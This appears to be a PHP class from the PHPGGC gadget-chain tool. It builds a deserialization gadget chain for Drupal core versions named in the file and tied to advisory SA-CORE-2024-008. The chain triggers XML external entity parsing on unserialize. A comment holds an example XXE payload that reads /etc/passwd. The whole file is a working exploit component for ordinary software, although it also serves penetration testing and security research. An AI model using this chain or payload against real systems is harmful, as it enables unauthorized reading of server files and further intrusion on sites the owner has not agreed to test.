<?php

namespace GadgetChain\Drupal;

class XXE1 extends \PHPGGC\GadgetChain\XXE
{
    public static $version = '>= 8.0.0 < 10.2.11 || >= 10.3.0 < 10.3.9';
    public static $vector = '__wakeup';
    public static $author = 'mcdruid';
    public static $information = 'See: https://gist.github.com/paul-axe/2a384bb5f2d430dd3b63b2484af960f4
    See: https://www.drupal.org/sa-core-2024-008
    This version accepts a local XML file path instead of a URI.
    Example payload file could contain:
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>';

    public function generate(array $parameters)
    {
        return new \Drupal\Core\Url(
            new \Drupal\Core\Database\StatementPrefetch(
                'SimpleXMLElement',
                [
                    $parameters['xml_content'],
                    LIBXML_BIGLINES | LIBXML_DTDLOAD | LIBXML_NOENT | LIBXML_PARSEHUGE
                ]
            )
        );
    }
} 